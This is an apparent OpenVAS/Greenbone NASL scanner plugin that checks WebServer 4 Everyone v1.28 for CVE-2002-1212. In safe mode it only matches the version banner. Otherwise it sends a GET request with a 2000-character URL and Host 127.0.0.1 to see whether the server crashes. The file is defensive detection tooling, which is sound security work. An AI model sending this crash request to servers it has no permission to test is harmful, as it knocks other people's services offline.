# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11167");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5967");
  script_cve_id("CVE-2002-1212");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Web Server 4 Everyone v1.28 Host Field DoS Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("W4E/banner");
  script_exclude_keys("www/too_long_url_crash");

  script_tag(name:"solution", value:"Upgrade your web server.");

  script_tag(name:"summary", value:"It may be possible to make Webserver4everyone execute
arbitrary code by sending it a too long url with
the Host: field set to 127.0.0.1");

  script_tag(name:"affected", value:"WebServer 4 Everyone v1.28 is known to be affected. Other
  versions might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

if(safe_checks())
{
  b = http_get_remote_headers(port: port);
  if (egrep(string: b, pattern: "WebServer 4 Everyone/1\.([01][0-9]?|2[0-8])"))
    security_message(port);
  exit(0);
}

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

req = string("GET /", crap(2000), " HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

if(http_is_dead(port: port))
{
  security_message(port);
  set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
